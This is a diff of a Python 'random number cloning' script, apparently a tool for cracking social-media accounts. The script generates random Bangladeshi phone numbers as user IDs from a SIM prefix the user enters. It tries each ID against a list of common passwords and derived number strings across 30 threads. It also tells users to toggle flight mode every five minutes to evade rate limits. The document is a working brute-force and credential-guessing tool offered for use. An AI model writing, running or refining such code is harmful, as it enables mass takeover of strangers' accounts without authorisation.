@@ -55,13 +55,29 @@ bu = current.month
 ha = current.day
 today = date.today()
 
-logo =("""\033[1;32m   _____             _      ______
-\033[1;32m  |  __ \           | |    |___  /  
-\033[1;37m  | |  | | __ _ _ __| | __    / /    
-\033[1;32m  | |  | |/ _` | '__| |/ /   / /    
-\033[1;32m  | |__| | (_| | |  |   <   / /__  
-\033[1;32m  |_____/ \__,_|_|  |_|\_\ /_____|  
-\033[1;32m----------------------------------------""")
+logo =("""
+
+██████╗░░█████╗░██████╗░██╗░░██╗        ███████╗
+██╔══██╗██╔══██╗██╔══██╗██║░██╔╝        ╚════██║
+██║░░██║███████║██████╔╝█████═╝░        ░░███╔═╝
+██║░░██║██╔══██║██╔══██╗██╔═██╗░        ██╔══╝░░
+██████╔╝██║░░██║██║░░██║██║░╚██╗        ███████╗
+╚═════╝░╚═╝░░╚═╝╚═╝░░╚═╝╚═╝░░╚═╝        ╚══════╝ 
+
+\033[1;91m\033[1;41m\033[1;97m              لا إله إلا الله محمد رسول الله               \033[;0m\033[1;91m\033[1;92m
+\033[1;91m\033[1;41m\033[1;97m           Allah makes the impossible possible                  \033[;0m\033[1;91m\033[1;92m
+
+\033[1;92m══════════════════════════════════════════
+\033[1;32m[👨] AUTHOR    :\033[1;32m DARK X FUZED 
+\033[1;32m[📖] GITHUB    :\033[1;32m CODERET-D-LOOPER
+\033[1;32m[😇] FACEBOOK  :\033[1;32m FIRDAWS SAPNO
+\033[1;32m[💉] TOOLS     :\033[1;32m RANDOM
+\033[1;32m[📅] VERSION   :\033[1;32m 1.0
+\033[1;32m[🚀] STATUS    :\033[1;32m WORKING
+\033[1;32m[⏳] UPDATE    :\033[1;32m AUTO-UPDATE [OFF]
+\033[1;92m══════════════════════════════════════════
+
+\033[1;91m<═══\033[1;41m\033[1;97m WORKING ONLY ON MOBILE DATA\033[;0m\033[1;91m═══>\033[1;92m""")
 loop = 0
 oks = []
 cps = []
@@ -124,28 +140,30 @@ def uf():
     os.geteuid
     os.system("clear")
     print(logo)
-    mr1 = '0171'
-    mr2 = '0181'
-    mr3 = '0191'
-    mr4 = '0161'
-    mr5 = '0151'
-    code = random.choice([mr1,mr2,mr3,mr4,mr5])
-    os.system('clear')
-    print(logo)
-    limit = int(input(f'\033[1;32m EXAMPLE : 2000, 4000, 6000, 10000, \n\033[1;32m----------------------------------------\n [+] PUT CLONING LIMIT: '))
+    print(" BD SIM CODE=><>< +88017,+88018,+88019,+88014,+88013,+88015")
+    print("\033[38;5;46m•\033[38;5;196m•\033[1;35m•\033[1;34m•\033[1;33m•\033[1;32m•\033[1;97m•\033[38;5;196m•\033[38;5;46m•\033[1;35m•\033[1;34m•\033[1;33m•\033[1;32m•\033[1;97m•\033[38;5;196m•\033[38;5;46m•\033[1;32m•\033[1;35m•\033[1;34m•\033[1;97m•\033[1;33m•\033[38;5;196m•\033[1;35m•\033[1;34m•\033[1;33m•\033[1;32m•\033[1;97m•\033[38;5;196m•\033[38;5;46m•\033[38;5;196m•\033[1;32m•\033[1;97m•\033[1;35m•\033[1;34m•\033[1;33m•\033[38;5;46m•\033[1;97m•")
+    kode = input(' [📞] ENTER SIM CODE: ')
+    kodex = ''.join(random.choice(string.digits) for _ in range(2))
+    kod = ''.join(random.choice(string.digits) for _ in range(2))
+    domain = ' RANDOM NUMBER CLONING '
+    limit = int(input('[?] ENTER YOUR CRACK LIMiT : '))
     for nmbr in range(limit):
-        nmp = ''.join(random.choice(string.digits) for _ in range(7))
+        nmp = ''.join(random.choice(string.digits) for _ in range(4))
         user.append(nmp)
-    with ThreadPool(max_workers=50) as morshed:
-        clear()
+    with ThreadPool(max_workers=30) as yaari:
+        os.system('clear')
+        print(logo)
         tl = str(len(user))
-        print(f' \033[1;91m[\033[1;92m✔︎\033[1;91m]\033[1;92m YOUR TOTAL IDS: {xr}'+tl)
-        print(' \033[1;91m[\033[1;92m✔︎\033[1;91m]\033[1;92m COUNTRY CODE : \033[1;32m'+code)
-        print("\033[1;32m----------------------------------------")
-        for love in user:
-            pwx = [love[1:],code[1:],code+love, 'Bangladesh', 'i love you', 'sadiya', 'fariya', 'sanjida', 'fatema', 'Farjana', 'jannat', '102030', '203040', '304050', '405060', '506070', '607080', '708090', '809010', 'mababa', 'shahin', 'sumaiya']
-            uid = code+love
-            morshed.submit(rcrack,uid,pwx,tl)
+        print(' \033[1;33m[♥]  TOTAL IDS :\033[1;92m ' + tl)
+        print(f"\033[1;33m [♥]  YOUR TARGET CRACK MENU:\033[1;92m {domain}")
+        print(' \033[1;33m[♥]  THE CRACK PROCESS HAS BEEN STARTED')
+        print(' \033[1;33m[♥]  WAIT FOR IDS ')
+        print("""\033[1;91m\033[1;41m\033[1;97m USE FLIGHT MODE IN EVERY 5 MIN\033[;0m\033[1;91m\033[1;92m""")
+        print(50 * '_')
+        for guru in user:
+            uid = kode + kodex + kod + guru
+            pwx = [kode + kodex + kod + guru, kod + guru, kodex + guru, kode + kodex + kod, 'Bangladesh', 'i love you', 'sadiya', 'fariya', 'sanjida', 'fatema', 'Farjana', 'jannat', '102030', '203040', '304050', '405060', '506070', '607080', '708090', '809010', 'mababa', 'shahin', 'sumaiya']
+            yaari.submit(rcrack,uid,pwx,tl)
 def rcrack(uid,pwx,tl):
     global loop
     global cps
